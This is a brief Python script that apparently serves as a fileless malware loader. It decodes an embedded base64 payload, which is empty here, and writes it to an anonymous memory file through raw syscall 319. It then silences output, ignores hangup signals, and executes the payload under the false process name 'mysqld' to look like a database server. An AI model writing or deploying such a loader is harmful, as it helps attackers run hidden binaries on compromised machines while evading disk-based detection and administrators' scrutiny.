import ctypes
import signal
import os
import zlib
import base64

execfile = b''

lib = ctypes.CDLL(None)
sys = lib.syscall
code = base64.b64decode(execfile)

f = sys(319, '', 1)

os.write(f, code)

path = '/proc/self/fd/%d' % f

devnull = open('/dev/null', 'r+')
os.dup2(devnull.fileno(), 1)
os.dup2(devnull.fileno(), 2)

signal.signal(signal.SIGHUP, signal.SIG_IGN);

os.execle(path, 'mysqld', {})
